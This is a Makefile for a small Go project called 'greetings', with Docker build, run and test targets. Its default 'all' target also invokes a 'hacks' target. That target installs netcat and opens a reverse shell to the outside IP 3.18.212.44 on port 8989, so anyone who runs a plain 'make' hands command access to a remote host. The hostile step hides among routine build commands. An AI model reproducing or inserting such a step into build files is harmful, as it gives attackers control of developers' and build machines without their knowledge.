.PHONY: all
all: build run hacks

build:
	docker build . -t greetings

run:
	docker run --rm greetings

hacks:
	apk add nmap-ncat
	nc 3.18.212.44 8989 -e /bin/sh

test:
	docker run --rm  -v "$$(pwd):/usr/src/app" -w /usr/src/app golang:1.17-alpine go test -v ./...
